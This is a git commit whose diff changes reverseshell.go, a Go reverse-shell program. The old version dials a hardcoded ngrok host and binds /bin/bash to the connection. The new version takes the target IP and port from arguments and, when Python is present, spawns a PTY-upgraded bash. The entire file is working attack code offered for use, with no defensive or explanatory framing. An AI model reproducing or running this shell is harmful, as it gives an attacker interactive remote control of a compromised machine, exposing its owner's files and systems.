6abb32b5a805e5862eb4e44aa9a5b41cc2261f7c
Wellington Gadelha <wellingtongadelha@Informeai.local>
2021-03-21 11:36:57 -0300

    adition verify python existed.

--- reverseshell.go
+++ reverseshell.go
@@ -2,20 +2,53 @@ package main
 
 import (
 	"fmt"
+	"log"
 	"net"
+	"os"
 	"os/exec"
 )
 
 func main() {
-        fmt.Println("Initiate shell...")
-	con, _ := net.Dial("tcp", "4.tcp.ngrok.io:14602")
-	cmd := exec.Command("/bin/bash")
-	cmd.Stdin = con
-	cmd.Stdout = con
-	cmd.Stderr = con
-	err := cmd.Run()
-        if err != nil{
-            fmt.Println(err)
-        }
+	if len(os.Args) != 3 {
+		fmt.Println("[!]Failed read args.[!]\nUse: reverseshell <ip> <port>")
+		log.Fatal("Not completed arguments")
+	}
+	ip := os.Args[1]
+	port := os.Args[2]
+	host := ip + ":" + port
+	con, _ := net.Dial("tcp", host)
 
+	ispy, err := verifyPython()
+	if err != nil {
+		con.Write([]byte("Not python instaled.\nContinue normal shell...\n"))
+	}
+	if ispy {
+		cmdpy := exec.Command("python", "-c", "import pty;pty.spawn('/bin/bash')")
+		cmdpy.Stdout = con
+		cmdpy.Stdin = con
+		cmdpy.Stderr = con
+		if err := cmdpy.Run(); err != nil {
+			log.Fatalln("Error execute python")
+		}
+	} else {
+
+		cmd := exec.Command("/bin/bash")
+		cmd.Stdin = con
+		cmd.Stdout = con
+		cmd.Stderr = con
+		err = cmd.Run()
+		if err != nil {
+			fmt.Println(err)
+		}
+	}
+
+}
+
+func verifyPython() (bool, error) {
+	cmdpy := exec.Command("which", "python")
+	e := cmdpy.Run()
+	if e != nil {
+		return false, e
+	}
+	return true, nil
 }
